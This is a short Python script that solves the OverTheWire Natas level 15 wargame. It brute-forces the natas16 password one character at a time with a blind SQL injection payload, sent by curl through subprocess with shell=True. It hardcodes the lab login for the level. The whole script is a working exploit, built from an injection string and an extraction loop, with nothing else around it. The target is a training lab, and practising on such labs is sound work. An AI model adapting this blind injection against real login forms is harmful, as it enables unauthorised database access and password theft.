import string
import subprocess
 
chars = string.printable[:62] # [a-zA-Z0-9]
natas15_pw = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" # this level's password.
pw_length = len(natas15_pw)
solved_pw = ""
 
# go through each position of the password, trying out every possible character, and add that character
# to the solved password, if "exists" appears on the curl page ("This user exists.")
for i in range(1,pw_length+1):
    print(f"current solution: {solved_pw}")
    for char in chars:
        SQL_injection = "natas16\\\" AND (select cast(substring(password, "+str(i)+", 1) as binary)=cast('"+char+"' as binary));#\""
        if (b"exists" in subprocess.check_output("curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -X POST --data-urlencode \"username="+SQL_injection+" http://natas15.natas.labs.overthewire.org/", shell = True)):
            solved_pw += char
            break
        
print(solved_pw)
